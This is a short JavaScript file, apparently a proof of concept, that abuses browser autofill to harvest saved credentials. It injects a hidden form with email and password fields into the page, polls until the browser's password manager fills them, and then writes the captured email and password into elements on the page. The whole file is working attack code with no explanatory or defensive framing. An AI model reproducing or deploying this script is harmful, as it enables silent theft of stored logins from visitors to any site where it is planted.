function injectScript() {
    // create a form dynamically
    let form = document.createElement("form");
    form.setAttribute('autocomplete', 'on');
    form.style.display = 'none';

    // create an input element for email
    let email = document.createElement('input');
    email.setAttribute('type', 'text');
    email.setAttribute('name', 'emailID');
    email.setAttribute("id", "inputEmail");

    // create an input element for password
    let password = document.createElement('input');
    password.setAttribute('type', 'password');
    password.setAttribute('name', 'password');
    password.setAttribute('id', 'inputPassword');

    form.appendChild(email);
    form.appendChild(password);

    document.getElementsByTagName('body')[0].appendChild(form);
}

function getInputData(id) {
    let input = document.getElementById(id);
    return input?.value;
}

function sniffInput(id) {
    let inputValue = getInputData(id);

    if (inputValue?.length) {
        let span = document.getElementById(id + '-span');
        span.replaceWith(inputValue);
    }
    else {
        setTimeout(sniffInput, 100, id);
    }
}

injectScript();

sniffInput('inputEmail');
sniffInput('inputPassword');